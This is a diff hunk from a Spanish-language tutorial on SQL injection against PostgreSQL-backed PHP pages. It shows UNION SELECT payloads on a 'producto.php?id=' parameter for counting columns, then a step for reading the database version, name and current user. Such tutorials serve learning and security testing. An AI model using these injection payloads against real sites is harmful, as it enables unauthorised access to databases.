@@ -5,7 +5,7 @@ GUIA PARA INYECCION EN POSTGRESQL
 	../producto.php?id=-1' union select null -- 
 	../producto.php?id=-1' union select null, null, null
 	
-	en este caso seria 4 campos (union select null, null, null, null)
+	**en este ejemplo son 4 campos (union select null, null, null, null)
 	
 2- Una vez reconocemos la cantidad de columnas, averiguamos la version de la bbdd, el nombre de la bd actual y el usuario actual 
 	
